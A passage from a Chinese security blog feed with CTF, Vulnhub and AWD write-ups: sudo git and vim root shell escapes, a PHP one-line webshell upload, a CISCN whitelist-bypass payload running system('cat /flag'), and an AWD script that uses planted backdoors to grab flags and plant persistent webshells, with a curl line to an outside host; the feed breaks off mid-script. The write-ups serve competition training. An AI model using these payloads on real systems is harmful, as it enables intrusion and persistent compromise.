awk">cat <span class="hljs-regexp">/home/</span>jerry/flag4.txt<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071610585.png" alt="image-20230507161056537"></p><p>提示了我们git，还有root看来是要提权的操作</p><h2 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">sudo -l #列出当前用户在系统上可以执行的命令和命令集合sudo命令选项<br></code></pre></td></tr></table></figure><p>发现git能使用root的权限</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sudo git help config<br></code></pre></td></tr></table></figure><p>回车然后输入</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript">!<span class="hljs-regexp">/bin/</span>bash  (这里bash也可以换成sh)<br></code></pre></td></tr></table></figure><h3 id="找flag"><a href="#找flag" class="headerlink" title="找flag"></a>找flag</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd /<br><span class="hljs-built_in">find</span> / -name <span class="hljs-number">*f</span>lag*<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071616615.png" alt="image-20230507161658563"></p><h3 id="查看flag-1"><a href="#查看flag-1" class="headerlink" title="查看flag"></a>查看flag</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/root/</span><span class="hljs-keyword">final</span>*<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071618364.png" alt="image-20230507161812324"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.利用字典生成工具cewl</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cewl 网址(如https:<span class="hljs-regexp">//</span>www.baidu.com) -w 文件名(如dict.txt)<br></code></pre></td></tr></table></figure><ol start="2"><li><p>扫描工具WPScan（只适用于WordPress）<a href="https://zhuanlan.zhihu.com/p/149725645">Kali(渗透工具):WPScan的使用</a></p><p>口令爆破</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">wpscan <span class="hljs-attr">--url</span> 网站地址 -U 用户名字典 -<span class="hljs-selector-tag">P</span> 密码字典<br></code></pre></td></tr></table></figure></li></ol><p>3.Linux命令</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">vi</span>(或vim)<br></code></pre></td></tr></table></figure><p>可配合提权操作，进去后，按Esc键可执行操作，输入一下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cobol">:set shell=/bin/bash（bash可以用sh代替）<br><br><br><br>:shell<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含2</title>
    <link href="/2022/05/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2/"/>
    <url>/2022/05/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2/</url>
    
    <content type="html"><![CDATA[<h1 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h1><p>​</p><p>进入题目</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111030492.png" alt="img"></p><p>查看网页源代码</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111030704.png" alt="img"></p><p>发现有upload.php，访问发现文件上传，上传一句话木马。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">php</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[shell])</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111030879.png" alt="img"></p><p>蚁剑连接一句话木马。</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111030730.png" alt="img"></p><p>找到flag，提交</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111030537.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN  初赛Love Math</title>
    <link href="/2022/04/09/CISCN%202019%20%E5%88%9D%E8%B5%9BLove%20Math/"/>
    <url>/2022/04/09/CISCN%202019%20%E5%88%9D%E8%B5%9BLove%20Math/</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h1><p>1.源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;   <span class="hljs-comment">//限制长度</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<span class="hljs-comment">//黑名单过滤</span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>payload：?c&#x3D;($_GET[pi])($_GET[abs])&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</p><p>但是这里的_GET是无法进行直接替换，而且[]也被黑名单过滤了</p><p>这里就需要去了解一下他给的白名单里面的函数了</p><p>这里说一下需要用到的几个函数</p><p>这里先将_GET来进行转换的函数</p><h5 id="x2F-x2F-hex2bin-函数"><a href="#x2F-x2F-hex2bin-函数" class="headerlink" title="&#x2F;&#x2F;hex2bin() 函数"></a>&#x2F;&#x2F;hex2bin() 函数</h5><p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p><p> <a href="http://www.w3school.com.cn/php/php_ref_math.asp%E4%B8%AD%E5%8F%91%E7%8E%B0base_convert()%E5%87%BD%E6%95%B0%E8%83%BD%E5%A4%9F%E5%9C%A8%E4%BB%BB%E6%84%8F%E8%BF%9B%E5%88%B6%E4%B9%8B%E9%97%B4%E8%BD%AC%E6%8D%A2%E6%95%B0%E5%AD%97">www.w3school.com.cn/php/php_ref_math.asp中发现base_convert()函数能够在任意进制之间转换数字</a>  </p><p>这里的_GET是ASCII 字符，用在线工具将_GET转换为十六进制</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304082327628.png" alt="img"></p><p>hex2bin(5f 47 45 54) 就是 _GET,但是hex2bin()函数也不是白名单里面的，而且这里的5f 47 45 54也不能直接填入，这里会被</p><p> preg_match_all(‘&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;‘, $content, $used_funcs);  </p><p>来进行白名单的检测。</p><p>这里的hex2bin()函数可以通过base_convert()函数来进行转换</p><p>base_convert()函数能够在任意进制之间转换数字</p><p>这里的hex2bin可以看做是36进制，用base_convert来转换将在10进制的数字转换为16进制就可以出现hex2bin</p><p>hex2bin&#x3D;base_convert(37907361743,10,36)</p><p>然后里面的5f 47 45 54要用dechex()函数将10进制数转换为16进制的数</p><p>dechex(1598506324)，1598506324转换为16进制就是5f 47 45 54</p><p>最终的payload：</p><p>&#x2F;?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AWD攻击流程</title>
    <link href="/2022/03/19/AWD%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B/"/>
    <url>/2022/03/19/AWD%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="AWD攻击流程"><a href="#AWD攻击流程" class="headerlink" title="AWD攻击流程"></a>AWD攻击流程</h1><h2 id="攻击步骤："><a href="#攻击步骤：" class="headerlink" title="攻击步骤："></a>攻击步骤：</h2><h2 id="1-管理后台"><a href="#1-管理后台" class="headerlink" title="1.管理后台"></a>1.管理后台</h2><p>1.知彼知己，首先拿到服务器之后搞清楚自己防守机IP，搞清楚其他队伍的IP。</p><p>IP划分一般存在三种情况</p><p>分配C段地址，分配B段地址和分配端口</p><p>假如有50只队伍,一般会类似于这样的 C段192.168.1.<strong>1–50</strong></p><p>同理是B端地址就会类似于这样    B段：192.168.<strong>1–50</strong>.1</p><p>如果是分配端口的则需要在IP后面加上端号，如端口号为8801</p><p>“192.168.1.1:8801” 这样才能访问。</p><p> 常用IP地址我们分为三类</p><p> A类 从1.0.0.0 到126.255.255.255<br> B类 从128.0.0.0到191.255.255.255<br> C类 从192.0.0.0到223.255.255.255</p><p>其中127.x.x.x段地址空间是被保留的回环地址</p><p>如何搞清楚其他队伍的IP呢？</p><h3 id="首先进行扫描："><a href="#首先进行扫描：" class="headerlink" title="首先进行扫描："></a>首先进行扫描：</h3><p>利用脚本扫描B段，C段网络，端口</p><p>1.探测后台 常见的后台地址一般为admin，admin.php，admin.html , login.php，并且大概率是弱口令，或可以用万能密码登录的漏洞，即使存在验证码也有绕过的可能，除了手动测试，burp爆破外还可以用web_pwd_common_crack，对网站进行弱口令进行快速识别，（工具运行环境python2）</p><h3 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h3><p>全场的后台口令默认值是相同的 ，又是相同源码搭建的网站，在进入后台后第一时间把自己后台密码修改掉，并告知攻击手。</p><h3 id="攻击："><a href="#攻击：" class="headerlink" title="攻击："></a>攻击：</h3><p>攻击手用脚本快速打开其他队伍网站的后台界面，修改掉其他队伍的后台登陆密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> webbrowser <span class="hljs-comment">#导入了webborwser模块</span><br>file=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;url_admin.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>file_list=flie.readlines()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> file_list:<br>    <span class="hljs-keyword">try</span>:<br>        webborwser.<span class="hljs-built_in">open</span>(i.strip())<span class="hljs-comment">#webbrowser.open()函数打开了每个URL trip()函数用于删除URL中的空格和换行符。</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>)<br>        <br></code></pre></td></tr></table></figure><p>如若自己后台密码已经被对手快速改掉了，就要通过数据库修改自己防守的管理员密码</p><p>首先要找到连接数据库的用户和密码，该信息一般存在于源码的某个配置文件中，一般名字为config.php config.ini db.ini 等，如果，没有找到该文件可以通过notepad++将mysql连接端口作为关键字搜索。</p><p>例如下图</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304161001272.png" alt="image-20230416100107076"></p><p>进入到config.inc.php ,可得到连接数据库的用户名和密码</p><p><img src="C:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20230416095907780.png" alt="image-20230416095907780"></p><p> 终端输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql   -uadmin  -p123456<br></code></pre></td></tr></table></figure><p>进入数据库后修改管理后台登录的密码，一般情况下密码会以哈希加密的形式被存储，所以替换的时候要进行同样的加密，所以需要在源码中找到加密算法，一般在function.php中,以pikachu为例如图所示：</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304161510261.png" alt="image-20230416151047170"></p><p>接下来咱们进行，简单分析以下如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">password_create</span>(<span class="hljs-params"><span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(pass);<br><span class="hljs-variable">$get_rand</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">30</span>),<span class="hljs-number">2</span>);<br><span class="hljs-variable">$newpass</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$get_rand</span>).<span class="hljs-string">&quot;:&quot;</span>.<span class="hljs-variable">$get_rand</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$newpass</span>;<br>&#125;<br>&gt;<br></code></pre></td></tr></table></figure><p>以admin为例admin的md5为例：21232f297a57a5a743894a0e4a801fc3，随机取出两个连续的字母跟pass拼接，最后$newpass的值为：</p><p>接下来只需要将newpass的值换掉即可</p><p>767bb352046d8df71041d1083c34b04b:7a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">password_create</span>(<span class="hljs-params"><span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(pass);<br><span class="hljs-variable">$get_rand</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">30</span>),<span class="hljs-number">2</span>);<br><span class="hljs-variable">$newpass</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$get_rand</span>).<span class="hljs-string">&quot;:&quot;</span>.<span class="hljs-variable">$get_rand</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$newpass</span>;<br>&#125;<br><span class="hljs-variable">$pass</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$newpass</span> = <span class="hljs-title function_ invoke__">password_create</span>(<span class="hljs-variable">$pass</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$newpass</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304161539823.png" alt="image-20230416153916770"></p><p>以pikachu为例：</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304161546059.png" alt="image-20230416154641025"></p><p>初始密码为123456的md5</p><p>将md5值改为654321的MD5</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304161547523.png" alt="image-20230416154759475"></p><p>输入654321能出现登录成功。</p><h2 id="2-预留后门"><a href="#2-预留后门" class="headerlink" title="2.预留后门"></a>2.预留后门</h2><p>当防御手将源码从服务器打包下载下来，使用D盾安全狗等webshell扫描工具检测后，第一时间清除预留后门，同时告知攻击手后门路径。（一句话木马，有连接密码）</p><h3 id="防御手"><a href="#防御手" class="headerlink" title="防御手"></a>防御手</h3><p>扫描并清除后门</p><p>D盾安全狗等扫描工具无法检测出file_get_content(“&#x2F;flag.php”)等存在危险的代码文件，需要防御手进一步去做代码审计。</p><h3 id="攻击手"><a href="#攻击手" class="headerlink" title="攻击手"></a>攻击手</h3><p>知道了预留的后门位置及连接密码后，攻击手可以结合之前写的IP扫描脚本写一个可以获取其他队伍flag，自动提交flag以及上传不死马的文件文件并激活的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> re<br>lock=threading.Lock()<br><span class="hljs-built_in">dir</span>=<span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-comment">#修改为不死马的上传路径</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_post_Flag</span>(<span class="hljs-params">shell_url</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">type</span>)==<span class="hljs-number">1</span>):<br>            res=requests.get(shell_url,payload,timeout=<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">else</span>:<br>            res=requests.post(shell_url,payload,timeout=<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">if</span> res.status_code==<span class="hljs-number">200</span>:<br>            flag_pattern=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;flag&#123;(.*?)&#125;&#x27;</span>,re.I)<br>            flag=flag_pattern.findall(<span class="hljs-built_in">str</span>(res.text))[<span class="hljs-number">0</span>]<br>            flag=<span class="hljs-string">&quot;flag&#123;&quot;</span>+flag+<span class="hljs-string">&quot;&#125;&quot;</span><br>            result=shell_url+<span class="hljs-string">&quot;connect shell sucess,flag is &quot;</span>+flag<br>            <span class="hljs-built_in">print</span>(result)<br>            flag_text.write(flag+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(shell_url+<span class="hljs-string">&quot;shell 404&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(shell_url+<span class="hljs-string">&quot;connect shell fail&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit_Flag</span>(<span class="hljs-params">flag_url,data</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#headers=&#123;&#x27;Content-Type&#x27;:&#x27;application/json;charset=utf-8&#x27;,</span><br>        <span class="hljs-comment">#&#x27;Authorization&#x27;:&#x27;e2b69d&#x27;</span><br>        <span class="hljs-comment"># &#125;</span><br>        res=requests.post(flag_url,data,timeout=<span class="hljs-number">1</span>)<br>        <span class="hljs-comment">#res=requests.request(&quot;post&quot;,flag_url,json=data,hraders=headers,timeout=1)</span><br>        <span class="hljs-keyword">if</span> res.status_code==<span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;submit flag success--&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;submit flag fail&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(flag_url+<span class="hljs-string">&quot;connect fail&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare_get_post</span>():<br>    lock.acquire(<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">global</span> payload<br>    payload=&#123;passwd:<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>&#125;<br>    <span class="hljs-comment">#payload=&#123;passwd:&quot;system(&#x27;curl http://flag.host9getflag.php&#x27;);&quot;&#125; #需要修改</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> url_head:<br>        url_head1=i.strip()+<span class="hljs-built_in">dir</span>+<span class="hljs-string">&#x27;/file.php&#x27;</span><br>        shell_url=i.strip()+shell_addr<br>        get_post_Flag(shell_url)<br>        submit_undead_ma(shell_url)<br>        activate_undead_ma(url_head1)<br>    flag_text.close()<br>    first_flag=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;firstround_flag.txt&#x27;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>    first_flag_list=first_flag_readlines()<br>    flag_server=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+]请输入提交flag的网址 INput example：http://192.168.194.147a;9090/ \n&quot;</span>)<br>    token=<span class="hljs-built_in">input</span>(<span 